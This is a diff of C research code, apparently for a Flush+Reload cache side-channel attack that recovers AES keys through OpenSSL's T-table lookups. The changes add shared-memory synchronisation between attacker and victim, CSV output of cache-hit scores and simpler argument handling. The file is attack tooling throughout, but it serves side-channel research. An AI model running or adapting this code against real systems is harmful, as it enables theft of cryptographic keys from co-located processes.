@@ -1,7 +1,7 @@
 /**
  *	shared memory client (POSIX)
  *
- *	Copyright (C) 2016  Jinbum Park <jinb.park7@gmail.com> Haehyun Cho <haehyun@asu.edu>
+ *	Copyright (C) 2016  Jinbum Park <jinb.park7@gmail.com>
 */
 
 #include "common.h"
@@ -10,8 +10,34 @@
 #include <libflush.h>
 #include <pthread.h>
 #include <sched.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <mqueue.h>
+#include <pthread.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <sys/un.h>
 
 #define MAX_PLAINS 3000
+
+#define ASYNC_DEFAULT 0
+#define ASYNC_PRELOAD_END 1
+#define ASYNC_FLUSH_END 2
+#define ASYNC_ONE_ROUND_END 3
+#define ASYNC_RELOAD_END 4
+#define ASYNC_SMOKE_INIT 5
+
+#define ASYNC_SHM_NAME "async_shm"
+#define ASYNC_PERM_FILE (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)
+
 
 U8 real_key[16] = {0x9e,0x41,0x00,0x5f,0xd9,0xa0,0xc2,0x28,0xe7,0xb4,0x31,0x29,0x94,0xaa,0x4d,0xc7};
 U8 infer_key[16] = {0,};
@@ -26,6 +52,9 @@ unsigned int *te0 = NULL;
 unsigned int off_te0;
 const int cache_line_size = 64;
 uint64_t threshold = 300;
+
+int async_shm_fd = -1;
+unsigned int *async_shm_addr = NULL;
 
 /*
  * x86_64 :
@@ -47,6 +76,9 @@ U32 thread_plain = 0;
 U32 score[16][16] = {0,};
 
 libflush_session_t *session;
+
+U8 theory_arr[16] = {0,};
+U32 arr_score[16] = {0,};
 
 void bind_cpu(int id)
 {
@@ -193,17 +225,15 @@ static void hex_string_to_int(unsigned char *pIn, unsigned int pInLen, unsigned 
 
 void get_args(int argc, char **argv)
 {
-	if(argc != 7) {
-		printf("USAGE: ./attack <plain text cnt> <cache hit threshold> <offset te0> <first waiting time> <waiting time> <crypto library path>\n");
-		printf("EXAMPLE: ./attack 1000 200 001636c0 75 75 10 12 libcrypto.so.1.0.0\n");
+	if(argc != 5) {
+		printf("USAGE: ./attack <plain text cnt> <cache hit threshold> <offset te0> <crypto library path>\n");
+		printf("EXAMPLE: ./attack 1000 200 001636c0 libcrypto.so.1.0.0\n");
 		exit(-1);
 	}
 
 	plain_text_cnt = atoi(argv[1]);
 	threshold = (uint64_t)atoi(argv[2]);
 	hex_string_to_int(argv[3], strlen(argv[3]), &off_te0);
-	first_start_cycle = atoi(argv[4]);
-	start_cycle = atoi(argv[5]);
 }
 
 static inline void flush_te(U32 x)
@@ -251,6 +281,59 @@ void threshold_test(void)
 	}
 }
 
+void print_result_to_csv(void)
+{
+	FILE *fp = NULL;
+	char str[128] = {0,};
+	unsigned i;
+
+	fp = fopen("./result.csv", "w");
+	if (!fp) {
+		printf("fopen error\n");
+		return;
+	}
+
+	snprintf(str, 128, "test count,%d\n", plain_text_cnt);
+	fwrite(str, 1, strlen(str), fp);
+	
+	fwrite("cache result\n", 1, strlen("cache result\n"), fp);
+	for (i=0; i<16; i++) {
+		if (i == 15)
+			snprintf(str, 128, "0x%lx\n", (unsigned long)(te0 + i * 16));
+		else
+			snprintf(str, 128, "0x%lx,", (unsigned long)(te0 + i * 16));
+		fwrite(str, 1, strlen(str), fp);
+	}
+	
+	for (i=0; i<16; i++) {
+		if (i == 15)
+			snprintf(str, 128, "%d\n", arr_score[i]);
+		else
+			snprintf(str, 128, "%d,", arr_score[i]);
+		fwrite(str, 1, strlen(str), fp);
+	}
+
+	fwrite("\ntheoretical result\n", 1, strlen("\ntheoretical result\n"), fp);
+	for (i=0; i<16; i++) {
+		if (i == 15)
+			snprintf(str, 128, "0x%lx\n", (unsigned long)(te0 + i * 16));
+		else
+			snprintf(str, 128, "0x%lx,", (unsigned long)(te0 + i * 16));
+		fwrite(str, 1, strlen(str), fp);
+	}
+	
+	for (i=0; i<16; i++) {
+		if (i == 15)
+			snprintf(str, 128, "%d\n", theory_arr[i]);
+		else
+			snprintf(str, 128, "%d,", theory_arr[i]);
+		fwrite(str, 1, strlen(str), fp);
+	}
+
+	fclose(fp);
+}
+
+
 struct shm_msg *client_msg;
 struct shm_msg *server_msg;
 
@@ -281,9 +364,9 @@ void *encrypt_thread(void *arg)
 	bind_cpu(2);
 
 	while(thread_stop == 0) {
-		if(attack_flag == 1) {
+		if(*(volatile int *)(&attack_flag) == 1) {
 			do_encrypt(thread_plain);
-			attack_flag = 0;
+			*(volatile int *)(&attack_flag) = 0;
 		}
 	}
 	return NULL;
@@ -343,7 +426,6 @@ void finalize_thread(void)
 	}
 }
 
-U32 arr_score[16] = {0,};
 static inline void arr_add_score(U8 *arr)
 {
 	U8 i;
@@ -364,7 +446,6 @@ static inline void print_score(void)
 
 void print_theory_arr(int plain_idx)
 {
-	U8 theory_arr[16] = {0,};
 	U8 val;
 	U32 i;
 
@@ -393,6 +474,7 @@ void do_attack(void)
 	U32 sum;
 	U32 sleep_cycle;
 	U32 first_sleep_cycle;
+	unsigned int status;
 
 	U8 ideal[256];
 
@@ -422,41 +504,39 @@ void do_attack(void)
 
 			for(i=0; i<16; i++) {
 				/* 1. Ask encryption */
-				attack_flag = 1;
+				*(volatile int *)(&attack_flag) = 1;
 
-				/* 2. Wait to finish pre-load of victim */
-				for(c=0; c<first_sleep_cycle; c++)
-					__asm__ __volatile__ ("nop");
+				while (1) {
+					if (*((volatile unsigned int *)async_shm_addr) == ASYNC_SMOKE_INIT)
+						break;
+				}
 
-				/* 3. Flush */
-				first_try--;
-				if (first_try == 0)
-					printf("pre flush\n");
+				//printf("before flush\n");
 			#ifndef _FLUSH_THREAD
 				flush_te(i);
 			#else
 				flush_x = i;
 				run_and_exit_flush_thread();
 			#endif
-				if (first_try == 0)
-					printf("after flush\n");
+				//printf("after flush\n");
 
-				/* 4. Wait to finish one-round encryption */
-				for(c=0; c<sleep_cycle; c++)
-					__asm__ __volatile__ ("nop");
-					
-				/* 5. Reload */
-				if (first_try == 0)
-					printf("pre reload\n");
+				*((volatile unsigned int *)async_shm_addr) = ASYNC_FLUSH_END;
+				while (1) {
+					if (*((volatile unsigned int *)async_shm_addr) == ASYNC_ONE_ROUND_END)
+						break;
+				}
+
+				//printf("before reload\n");
 				if(reload_te_is_useful(i) == 1) {
 					cnt++;
 					arr[i] = 1;
 				}
-				if (first_try == 0)
-					printf("after reload\n");
+				//printf("after reload\n");
+
+				*((volatile unsigned int *)async_shm_addr) = ASYNC_RELOAD_END;
 				
 			WAIT_ATTACK:
-				while(attack_flag == 1)
+				while(*(volatile int *)(&attack_flag) == 1)
 					__asm__ __volatile__ ("nop");
 			}
 
@@ -488,6 +568,43 @@ void finalize_libflush(void)
 	libflush_terminate(session);
 }
 
+void create_async_shm(void)
+{
+	if((async_shm_fd = shm_open(ASYNC_SHM_NAME, O_CREAT | O_RDWR, ASYNC_PERM_FILE)) == -1) {
+        printf("shm_open error\n");
+        exit(-1);
+    }
+
+    if(ftruncate(async_shm_fd, 64) == -1) {
+        printf("ftruncate error\n");
+        exit(-1);
+    }
+
+    async_shm_addr = mmap(NULL, 64, PROT_READ | PROT_WRITE, MAP_SHARED, async_shm_fd, 0);
+    if(async_shm_addr == MAP_FAILED) {
+        printf("mmap error\n");
+        exit(-1);
+    }
+
+	*async_shm_addr = ASYNC_DEFAULT;
+    printf("[attacker] async status : %d\n", *async_shm_addr);
+}
+
+void delete_async_shm(void)
+{
+	if(munmap(async_shm_addr, 64) == -1) {
+        printf("munmap error\n");
+    }
+
+    if(close(async_shm_fd) == -1) {
+        printf("close error\n");
+    }
+
+    if(shm_unlink(ASYNC_SHM_NAME) == -1) {
+        printf("shm_unlink error\n");
+    }
+}
+
 int main(int argc, char **argv)
 {
 	char msg[MSG_SIZE_MAX];
@@ -502,9 +619,10 @@ int main(int argc, char **argv)
 	/* init */
 	get_args(argc, argv);
 	read_plains();
-	map_crypto(argv[6]);
+	map_crypto(argv[4]);
 	init_libflush();
-	threshold_test();
+	create_async_shm();
+	//threshold_test();
 	init_thread();
 
 	/* get shm */
@@ -525,6 +643,7 @@ int main(int argc, char **argv)
 
 	/* send msg */
 	do_attack();
+	print_result_to_csv();
 
 	/* send end msg */
 	client_msg->status = 0;
@@ -547,5 +666,6 @@ out:
 	finalize_libflush();
 	munmap(crypto_addr, crypto_size);
 	close(crypto_fd);
+	delete_async_shm();
 	return 0;
 }
